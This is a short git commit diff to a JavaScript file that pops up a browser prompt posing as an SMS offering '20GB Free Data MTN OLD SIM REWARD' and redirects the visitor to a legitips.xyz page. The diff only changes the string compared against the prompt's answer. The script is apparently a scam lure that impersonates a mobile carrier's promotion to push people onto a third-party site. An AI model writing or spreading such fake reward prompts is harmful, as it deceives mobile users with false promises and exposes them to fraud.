a8894c6f830578f93f1d7382d6b382014e540d2a
legitips <83867893+legitips@users.noreply.github.com>
2024-09-09 21:33:16 -0700

    Update activation-free-5g-datarewards.js

--- activation-free-5g-datarewards.js
+++ activation-free-5g-datarewards.js
@@ -1,5 +1,5 @@
 var password = '1'
 password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE. ','1');
-if (password != '1') {
+if (password != '20GB Free Data') {
 location.href='https://legitips.xyz/free-5g-datarewards.html';
 }
